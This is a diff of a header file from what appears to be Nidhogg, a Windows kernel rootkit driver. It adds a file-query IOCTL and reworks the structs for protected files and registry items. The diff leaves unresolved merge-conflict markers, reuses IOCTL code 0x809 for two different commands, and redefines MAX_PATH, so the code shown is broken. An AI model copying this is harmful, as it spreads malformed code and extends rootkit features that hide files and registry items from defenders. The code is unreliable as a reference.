@@ -23,7 +23,9 @@
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+<<<<<<< HEAD
 #define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -38,9 +40,16 @@
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
 >>>>>>> 0a9676d (Pre version 0.1 (#6))
+=======
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+// #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
+>>>>>>> 4fc3e3e (Added file query ability)
 // *****************************************************************************************************
 
 #define MAX_PIDS 256
+#define MAX_PATH 260
 #define MAX_FILES 256
 #define MAX_REG_ITEMS 256
 #define REG_VALUE_LEN 260
@@ -75,13 +84,22 @@ struct ProcessGlobals {
 };
 ProcessGlobals pGlobals;
 
-struct FileGlobals {
+struct FileItem {
+	int FileIndex;
+	WCHAR FilePath[MAX_PATH];
+};
+
+struct FilesList {
 	int FilesCount;
-	WCHAR* Files[MAX_FILES];
+	WCHAR* FilesPath[MAX_FILES];
+};
+
+struct FileGlobals {
+	FilesList Files;
 	FastMutex Lock;
 
 	void Init() {
-		FilesCount = 0;
+		Files.FilesCount = 0;
 		Lock.Init();
 	}
 };
